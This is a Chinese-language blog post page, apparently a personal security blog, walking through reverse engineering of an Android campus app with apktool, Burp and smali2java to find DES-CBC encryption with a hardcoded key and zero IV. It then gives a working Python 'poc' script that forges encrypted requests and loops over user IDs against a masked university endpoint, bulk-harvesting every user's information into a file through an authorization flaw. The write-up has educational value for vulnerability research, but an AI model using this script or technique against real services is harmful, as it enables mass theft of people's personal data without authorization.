@@ -1,0 +1,751 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/images/dandan.png">
+  <link rel="icon" href="/images/dandan.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Encounter">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一个非常简单的APP逆向分析，学习一下Android应用的分析。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次对Android APP简单的逆向分析">
+<meta property="og:url" content="https://chujian521.github.io/blog/2023/11/19/%E4%B8%80%E6%AC%A1%E5%AF%B9Android-APP%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="X&#39;s blog">
+<meta property="og:description" content="一个非常简单的APP逆向分析，学习一下Android应用的分析。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chujian521.github.io/images/fj70.jpg">
+<meta property="og:image" content="https://chujian521.github.io/images/apktool.png">
+<meta property="og:image" content="https://chujian521.github.io/images/bp-app.png">
+<meta property="og:image" content="https://chujian521.github.io/images/encryptdata.png">
+<meta property="article:published_time" content="2023-11-19T06:17:46.000Z">
+<meta property="article:modified_time" content="2023-11-25T08:54:22.000Z">
+<meta property="article:author" content="Encounter">
+<meta property="article:tag" content="Android">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://chujian521.github.io/images/fj70.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>一次对Android APP简单的逆向分析 - X&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"chujian521.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"88d6a072634686f804175a1f3d287260","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?88d6a072634686f804175a1f3d287260";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>X&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="一次对Android APP简单的逆向分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-19 14:17" pubdate>
+          2023年11月19日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          55 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">一次对Android APP简单的逆向分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>一个非常简单的APP逆向分析，学习一下Android应用的分析。</strong></p>
+<p><img src="/images/fj70.jpg" srcset="/img/loading.gif" lazyload></p>
+<span id="more"></span>
+
+<h2 id="Apktool"><a href="#Apktool" class="headerlink" title="Apktool"></a>Apktool</h2><p>Apktool是一种用于对第三方、封闭的二进制 Android 应用程序进行逆向工程的工具。它可以将资源解码为接近原始形式，并在进行一些修改后重建它们；它可以逐步调试 SMALI 代码；此外，由于类似项目的文件结构和一些重复性任务（如构建 apk 等）的自动化，它使使用应用程序变得更加容易。</p>
+<p>下载链接（Github）：<a target="_blank" rel="noopener" href="https://github.com/iBotPeaches/Apktool/releases/">Releases · iBotPeaches&#x2F;Apktool (github.com)</a></p>
+<h3 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h3><p>执行下面的命令即可，base.apk是需要解包的apk文件，-o指定输出目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar apktool.jar d base.apk -o base<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/apktool.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="寻找接口"><a href="#寻找接口" class="headerlink" title="寻找接口"></a>寻找接口</h3><p>手机代理到电脑上的burpsuite代理端口，即可对手机上一些走系统代理的应用进行抓包，这个APP恰好走系统代理，并且是http协议发包，无需安装证书：</p>
+<p><img src="/images/bp-app.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试在手机上访问一些接口，就可以得到一些接口数据：</p>
+<p>然后可以看到，请求数据包和响应都是加密的：</p>
+<p><img src="/images/encryptdata.png" srcset="/img/loading.gif" lazyload></p>
+<p>这时候看起来没啥办法继续分析报文了，暂不考虑暴力解密，我们就从逆向的smali文件中找找线索，直接搜索接口名字发现APP完全没有做任何混淆，可以找到下面内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop/base/smali]<br>└─$ grep -r <span class="hljs-string">&quot;xxxxxService&quot;</span> <br>com/dses/camp******/common/DataUtils.smali:    const-string v4, <span class="hljs-string">&quot;/xxxxxService&quot;</span><br>com/dses/camp******/common/DataUtils.smali:    const-string v6, <span class="hljs-string">&quot;/xxxxxService&quot;</span><br>com/dses/camp******/common/DataUtils.smali:    const-string v6, <span class="hljs-string">&quot;/xxxxxService&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>找到以上目录，我们可以发现下列内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop/base/smali]<br>└─$ <span class="hljs-built_in">cd</span> com/dses/camp******/common/                  <br>                                                                                                           <br>┌──(kali㉿kali)-[~/…/com/dses/camp******/common]<br>└─$ <span class="hljs-built_in">ls</span><br>DataManager.smali  DES.smali                  Global.smali<br>DataUtils.smali    FileUtils.smali            MyResponseHandler.smali<br>GlideRoundTransform.smali  PersistenceCacheScope.smali<br><br></code></pre></td></tr></table></figure>
+
+<p>看到了一个可疑的DES文件，初步怀疑是使用了DES加密。</p>
+<h2 id="smali2java"><a href="#smali2java" class="headerlink" title="smali2java"></a>smali2java</h2><p>smali2java是一个将smali代码翻译成java代码的工具</p>
+<p>一个Github下载链接：<a target="_blank" rel="noopener" href="https://github.com/AlexeySoshin/smali2java/releases">Releases · AlexeySoshin&#x2F;smali2java (github.com)</a></p>
+<p>前面已经使用apktool将apk反编译成smali代码，并且我们发现了一个DES.smali代码，疑似加密用途，下面我们就将该代码翻译成Java代码更容易阅读：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#下载解压之后如果没有运行权限需要给程序添加可执行权限</span><br><span class="hljs-built_in">chmod</span> +x smali2java_linux_amd64<br><span class="hljs-comment">#翻译smali代码</span><br>./smali2java_linux_amd64 -path_to_smali=./base/smali/com/dses/camp******/common/DES.smali<br></code></pre></td></tr></table></figure>
+
+<p>然后我们就在smali目录下看到了翻译好的java代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.dses.camp******.common.DES &#123;<br>	 <span class="hljs-comment">/* .source &quot;DES.java&quot; */</span><br>	 <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.lang.String DESKey;<br>	 <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> iv;<br>	 <span class="hljs-keyword">static</span> com.dses.camp******.common.DES ( ) &#123;<br>		 <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;密钥&quot;</span>;<br>		 <span class="hljs-keyword">return</span>;<br>	 &#125; <span class="hljs-comment">// .end array-data</span><br>&#125; <span class="hljs-comment">// .end method</span><br><span class="hljs-keyword">public</span> com.dses.camp******.common.DES ( ) &#123;<br>	 <span class="hljs-keyword">return</span>;<br>&#125; <span class="hljs-comment">// .end method</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> java.lang.String <span class="hljs-title function_">decryptDES</span> <span class="hljs-params">( java.lang.String p0 )</span> &#123;<br>&#125; <span class="hljs-comment">// .end annotation</span><br><span class="hljs-type">int</span> <span class="hljs-variable">v5</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// const/4 v5, 0x0</span><br>com.cbs.utils.F$Base64 .base64Decode ( p0,v5 );<br>v5 = com.dses.camp******.common.DES.iv;<br>v5 = com.dses.camp******.common.DES.DESKey;<br>(( java.lang.String ) v5 ).getBytes ( ); <span class="hljs-comment">// invoke-virtual &#123;v5&#125;, Ljava/lang/String;-&gt;getBytes()[B</span><br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;DES&quot;</span>; <span class="hljs-comment">// const-string v6, &quot;DES&quot;</span><br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v5</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;DES/CBC/PKCS5Padding&quot;</span>; <span class="hljs-comment">// const-string v5, &quot;DES/CBC/PKCS5Padding&quot;</span><br>javax.crypto.Cipher .getInstance ( v5 );<br><span class="hljs-type">int</span> <span class="hljs-variable">v5</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>; <span class="hljs-comment">// const/4 v5, 0x2</span><br>(( javax.crypto.Cipher ) v1 ).init ( v5, v3, v4 ); <span class="hljs-comment">// invoke-virtual &#123;v1, v5, v3, v4&#125;, </span><br>(( javax.crypto.Cipher ) v1 ).doFinal ( v0 ); <span class="hljs-comment">// invoke-virtual &#123;v1, v0&#125;, </span><br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;gbk&quot;</span>; <span class="hljs-comment">// const-string v6, &quot;gbk&quot;</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> java.lang.String <span class="hljs-title function_">encryptDES</span> <span class="hljs-params">( java.lang.String p0 )</span> &#123;<br>v4 = com.dses.camp******.common.DES.iv;<br>v4 = com.dses.camp******.common.DES.DESKey;<br>(( java.lang.String ) v4 ).getBytes ( ); <span class="hljs-comment">// invoke-virtual &#123;v4&#125;, Ljava/lang/String;-&gt;getBytes()[B</span><br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v5</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;DES&quot;</span>; <span class="hljs-comment">// const-string v5, &quot;DES&quot;</span><br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v4</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;DES/CBC/PKCS5Padding&quot;</span>; <span class="hljs-comment">// const-string v4, &quot;DES/CBC/PKCS5Padding&quot;</span><br>javax.crypto.Cipher .getInstance ( v4 );<br><span class="hljs-type">int</span> <span class="hljs-variable">v4</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// const/4 v4, 0x1</span><br>(( javax.crypto.Cipher ) v0 ).init ( v4, v2, v3 ); <span class="hljs-comment">// invoke-virtual &#123;v0, v4, v2, v3&#125;, </span><br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">v4</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;gbk&quot;</span>; <span class="hljs-comment">// const-string v4, &quot;gbk&quot;</span><br>(( java.lang.String ) p0 ).getBytes ( v4 ); <span class="hljs-comment">// invoke-virtual &#123;p0, v4&#125;, </span><br>(( javax.crypto.Cipher ) v0 ).doFinal ( v4 ); <span class="hljs-comment">// invoke-virtual &#123;v0, v4&#125;, </span><br><span class="hljs-type">int</span> <span class="hljs-variable">v5</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>; <span class="hljs-comment">// const/4 v5, 0x2</span><br>com.cbs.utils.F$Base64 .base64Encode ( v1,v5 );<br>&#125; <br><br></code></pre></td></tr></table></figure>
+
+<p>以上代码翻译的可能不是完全正确，但是我们可以大致分析出数据包采用了DES加密，加密模式为CBC，初始化向量为固定值0x0，数据的编码方式为gbk，padding的方式为PKCS5Padding，并且加密的结果是经过base64编码的。</p>
+<p>随后我们根据这个加密规则进行解密，成功将密文解密，然后发现没有进行任何鉴权，直接通过userid去查询用户的所有信息，那么我们就可以使用下面的poc脚本批量获取接口数据了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># poc.py</span><br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">import</span> concurrent.futures<br><br><span class="hljs-comment"># 全局锁，用于确保对文件的写入操作是线程安全的</span><br>file_write_lock = threading.Lock()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_post_request</span>(<span class="hljs-params">url, data</span>):<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>    &#125;<br>    response = requests.post(url, headers=headers, data=data)<br><br>    <span class="hljs-keyword">return</span> response<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-comment"># PKCS padding</span><br>    pad_size = <span class="hljs-number">8</span> - (<span class="hljs-built_in">len</span>(text) % <span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">return</span> text + <span class="hljs-built_in">bytes</span>([pad_size] * pad_size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">des_encrypt</span>(<span class="hljs-params">key, data</span>):<br>    iv = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x00</span>] * <span class="hljs-number">8</span>)  <span class="hljs-comment"># Generate a random IV for CBC mode</span><br>    cipher = DES.new(key, DES.MODE_CBC, iv)<br>    padded_data = pad(data)<br>    encrypted_data = cipher.encrypt(padded_data)<br>    <span class="hljs-keyword">return</span> encrypted_data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">des_decrypt</span>(<span class="hljs-params">data, key</span>):<br>    iv = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x00</span>] * <span class="hljs-number">8</span>)  <span class="hljs-comment"># Generate a random IV for CBC mode</span><br>    cipher = DES.new(key, DES.MODE_CBC, iv)<br>    encrypted_data = base64.b64decode(data)<br>    decrypted_data = cipher.decrypt(encrypted_data)<br>    pad_size = decrypted_data[-<span class="hljs-number">1</span>]<br>    decrypted_data = decrypted_data[:-pad_size]<br>    <span class="hljs-keyword">return</span> decrypted_data.decode(<span class="hljs-string">&#x27;gb2312&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_string_value</span>(<span class="hljs-params">xml_string, key</span>):<br>    encrypted_string = xml_string.replace(<span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;&lt;/string&gt;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;&lt;string xmlns=&quot;http://tempuri.org/&quot;&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> encrypted_string <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        decrypted_string = des_decrypt(encrypted_string, key)<br>        <span class="hljs-keyword">return</span> decrypted_string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_and_write_data</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-comment"># 这里可以放置您要并发执行的任务逻辑</span><br>    <span class="hljs-comment"># Replace &#x27;密钥&#x27; with your actual key (8 bytes)</span><br>    key = <span class="hljs-string">b&#x27;密钥&#x27;</span><br>    data = base64.b64decode(<span class="hljs-string">&#x27;解密后的base64请求&#x27;</span>)<br>    data = data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&#x27;userid&#x27;</span>,<span class="hljs-built_in">str</span>(i)).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    encrypted_data = des_encrypt(key, data)<br><br>    <span class="hljs-comment"># Convert the encrypted data to Base64</span><br>    encrypted_base64 = base64.b64encode(encrypted_data).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-comment"># print(encrypted_base64)</span><br>    encrypted_base64 = parse.quote(encrypted_base64)<br>    <span class="hljs-comment"># print(encrypted_base64)</span><br>    url = <span class="hljs-string">&quot;http://xxx.xxxxx.edu.cn/campuxxxxxxxxx/xxxxxxxx.asmx/xxxxxService&quot;</span><br>    response = send_post_request(url, <span class="hljs-string">&quot;order=&quot;</span>+encrypted_base64)<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">with</span> file_write_lock:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;info.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;\t&#x27;</span>+extract_string_value(response.text, key)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed!&quot;</span>)<br>    <span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    data_list = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(userid_start, userid_stop))<br>    <span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="hljs-keyword">as</span> executor:<br>        <span class="hljs-comment"># 使用executor.map并发执行任务</span><br>        executor.<span class="hljs-built_in">map</span>(process_and_write_data, data_list)<br>        <br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure>
+
+<p>主要的问题是使用了硬编码密钥、不安全的加密算法、没有对APP加固、没有鉴权策略导致水平越权等一系列安全问题。</p>
+<h2 id="一些工具"><a href="#一些工具" class="headerlink" title="一些工具"></a>一些工具</h2><p>base64编码解码：<a target="_blank" rel="noopener" href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64 编码&#x2F;解码 - 在线工具 (toolhelper.cn)</a></p>
+<p>url编解码：<a target="_blank" rel="noopener" href="https://www.iamwawa.cn/urldecode.html">在线URL解码编码工具_蛙蛙工具 (iamwawa.cn)</a></p>
+<p>DES在线加解密：<a target="_blank" rel="noopener" href="https://the-x.cn/cryptography/Des.aspx">DES在线解密 DES在线加密 des hex - The X 在线工具 (the-x.cn)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Android/">#Android</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>一次对Android APP简单的逆向分析</div>
+      <div>https://chujian521.github.io/blog/2023/11/19/一次对Android-APP简单的逆向分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Encounter</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
